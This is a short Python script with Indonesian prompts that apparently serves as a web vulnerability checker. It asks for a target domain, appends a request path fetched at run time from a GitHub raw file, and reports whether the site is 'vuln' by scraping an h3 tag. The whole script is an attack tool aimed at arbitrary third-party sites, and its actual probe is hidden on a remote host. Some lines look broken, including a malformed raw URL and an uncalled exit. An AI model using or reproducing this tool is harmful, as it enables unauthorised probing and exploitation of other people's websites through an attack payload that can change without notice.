import os
from requests import get
from bs4 import BeautifulSoup

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

clear()

l1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/a.txt")
l1a = BeautifulSoup(l1.text, 'html.parser')
l1b = l1a.text.rstrip().lstrip()
print (l1b)

l2 = get("https://raw.githubusercontent.com/archive-code/gapenting/blob/master/2.txt")
l2a = BeautifulSoup(l2.text, 'html.parser')
l2b = l2a.text.rstrip().lstrip()
print (l2b)

uDOMEN = input('Masukkan Domain Target: ')
l3 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/b.txt")
l3a = BeautifulSoup(l3.text, 'html.parser')
l3b = l3a.text.rstrip().lstrip()

urla = get("http://"+uDOMEN+l3b)
soup = BeautifulSoup(urla.text, 'html.parser')
hasil = soup.find('h3')
try:
  res = hasil.text.rstrip().lstrip()
  print("RESULT = ") 
  print (res)
except:
  print('Situs Not Vuln Pak :(')
  exit
